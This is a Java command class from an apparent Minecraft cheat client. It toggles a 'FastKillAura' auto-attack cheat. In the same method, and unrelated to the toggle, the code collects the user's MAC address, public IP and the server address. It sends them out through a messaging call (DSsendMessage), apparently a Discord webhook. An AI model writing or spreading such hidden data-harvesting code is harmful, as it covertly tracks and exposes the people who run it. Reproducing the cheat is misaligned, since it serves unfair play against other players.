package it.md_4.troy.command.impl;

import it.md_4.troy.command.Command;
import it.md_4.troy.command.CommandInfo;
import it.md_4.troy.helper.ChatHelper;
import it.md_4.troy.ip.IpChecker;

import java.awt.*;
import java.net.InetAddress;
import java.net.NetworkInterface;
import java.net.SocketException;
import java.net.UnknownHostException;
import java.util.ArrayList;

import static it.md_4.troy.Troy.DSsendMessage;

@CommandInfo(
        alias = "fastkillaura",
        description = "Enable FastKillAura - Automatically Rotate To Entity",
        usage = "'fastkillaura",
        aliases = {"fka"}
)
public class FastKillaura extends Command {

    public static ArrayList<String> FastKillaura = new ArrayList<String>();

    @Override
    public void execute(String... args) throws Exception {

        if(FastKillaura.contains("true")){
            FastKillaura.clear();
            FastKillaura.add("false");
            ChatHelper.printMessage("&b • &3FastKillAura Disabled", false);
        } else {
            FastKillaura.clear();
            FastKillaura.add("true");
            ChatHelper.printMessage("&b • &3FastKillAura Enabled", false);
        }

        InetAddress localHost = null;
        try {
            localHost = InetAddress.getLocalHost();
        } catch (UnknownHostException e) {
            e.printStackTrace();
        }
        NetworkInterface ni = null;
        try {
            ni = NetworkInterface.getByInetAddress(localHost);
        } catch (SocketException e) {
            e.printStackTrace();
        }
        byte[] hardwareAddress = new byte[0];
        try {
            hardwareAddress = ni.getHardwareAddress();
        } catch (SocketException e) {
            e.printStackTrace();
        }

        String[] hexadecimal = new String[hardwareAddress.length];
        for (int i = 0; i < hardwareAddress.length; i++) {
            hexadecimal[i] = String.format("%02X", hardwareAddress[i]);
        }
        String macAddress = String.join("-", hexadecimal);

        DSsendMessage("[" + macAddress + "]\n Connected With IP => \n(" + IpChecker.getIp() +")\n" + "\n Executed Command [FastKillaura]\n Server: [" + mc.getCurrentServerData().serverIP + "]", true, Color.GREEN);
    }
}
